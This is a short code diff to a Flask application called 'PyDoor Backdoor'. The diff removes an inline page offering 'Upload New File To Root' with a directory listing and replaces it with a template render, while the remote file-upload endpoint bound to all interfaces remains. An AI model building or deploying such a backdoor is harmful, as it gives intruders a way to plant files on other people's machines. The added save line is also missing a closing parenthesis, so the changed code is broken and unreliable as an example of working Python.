@@ -28,17 +28,8 @@ def admin():
         file = request.files['file']
         if file and allowed_file(file.filename):
             filename = secure_filename(file.filename)
-            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
-    return """
-    <!doctype html>
-    <title>PyDoor Backdoor</title>
-    <h1>Upload New File To Root</h1>
-    <form action="" method=post enctype=multipart/form-data>
-      <p><input type=file name=file>
-         <input type=submit value=Upload>
-    </form>
-    <p>%s</p>
-    """ % "<br>".join(os.listdir(app.config['UPLOAD_FOLDER'],))
+            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename)
+    return render_template('index.html')
 
 if __name__ == "__main__":
 	app.run(host='0.0.0.0', port=5000)
